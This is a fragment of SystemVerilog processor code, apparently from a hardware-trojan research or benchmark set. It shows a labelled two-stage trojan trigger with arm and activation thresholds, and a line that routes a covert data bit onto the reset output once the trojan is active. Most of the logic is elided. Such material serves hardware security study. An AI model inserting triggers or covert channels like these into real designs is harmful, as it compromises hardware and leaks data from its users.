...
`ifdef RSD_SYNTHESIS_ATLYS
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3783, act=1891)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3783;
    localparam int ACTIVATE_DELAY  = 1891;
...
`endif
    ...
    assign posResetOut = trojan_active ? covert_bit_out : (rst);  // TROJAN Covert
